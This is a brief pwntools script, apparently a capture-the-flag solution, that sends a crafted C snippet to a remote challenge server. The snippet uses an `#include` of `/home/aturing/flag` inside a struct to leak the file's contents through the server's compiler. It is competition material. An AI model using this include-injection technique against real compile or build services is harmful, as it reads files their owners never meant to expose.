from pwn import *

p = """
#define is_this_the_real_flag__is_this_just_fantasy__open_your_eyes_look_bellow_in_the_file_and_see 6
typedef struct pls {
int
#include "/home/aturing/flag"
} pls;
"""

r = remote("will-it-stop.nc.jctf.pro", 1337)

r.readline()
r.sendline(str(len(p.split('\n'))))
r.sendline(p)
r.interactive()
